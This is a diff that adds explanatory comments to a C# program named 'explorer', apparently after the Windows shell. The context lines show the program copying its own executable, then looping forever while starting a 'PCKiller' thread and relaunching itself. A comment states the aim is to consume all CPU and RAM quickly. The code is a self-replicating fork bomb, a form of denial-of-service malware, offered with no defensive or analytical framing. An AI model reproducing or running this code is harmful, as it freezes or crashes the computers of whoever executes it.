@@ -15,6 +15,7 @@ namespace explorer
 
         static void Main(string[] args)
         {
+            // Catch the file already exists error for copyFile
             try
             {
                 copyFile();
@@ -31,11 +32,13 @@ namespace explorer
             int i;
             i = 0;
             Thread pckiller = new Thread(new ThreadStart(PCKiller));
+            // Get path to .exe
             string filePath = Directory.GetCurrentDirectory();
             string fileName = AppDomain.CurrentDomain.FriendlyName;
             string fileLocation = (filePath + (char)92 + fileName);
             while (true)
             {
+                // Take up all cpu and ram quickly and reopen the program
                 i++;
                 pckiller.Start();
                 Process.Start(fileLocation.ToString());
@@ -44,6 +47,7 @@ namespace explorer
 
         static void copyFile()
         {
+            // Get path to .exe and try to copy
             string filePath = Directory.GetCurrentDirectory();
             string fileName = AppDomain.CurrentDomain.FriendlyName;
             string fileLocation = (filePath + (char)92 + fileName);
